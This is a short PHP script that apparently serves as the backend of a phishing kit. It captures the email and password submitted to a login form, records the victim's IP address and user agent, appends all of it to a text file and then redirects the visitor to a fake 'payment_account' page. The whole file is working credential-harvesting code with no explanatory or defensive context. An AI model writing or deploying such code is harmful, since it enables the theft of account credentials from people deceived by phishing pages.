<?php

header("Location: payment_account.html");

$emailspm= $_POST['inputEmailHandle'];
$passspm= $_POST['inputPassword'];
$ipspm= $_SERVER['REMOTE_ADDR'];
$agentspm= $_SERVER['HTTP_USER_AGENT'];
$Spam = fopen("SUPV6678.txt", "a");

fwrite($Spam, "Email   : ");
fwrite($Spam, $emailspm);
fwrite($Spam, "
");
fwrite($Spam, "password: ");
fwrite($Spam, $passspm);
fwrite($Spam, "
");
fwrite($Spam, "IP      : ");
fwrite($Spam, $ipspm);
fwrite($Spam, "
");
fwrite($Spam, "USER AGENT : ");
fwrite($Spam, $agentspm);
fwrite($Spam, "\r\n");
fwrite($Spam, "================================");
fwrite($Spam, "\r\n");
fclose($Spam);
?>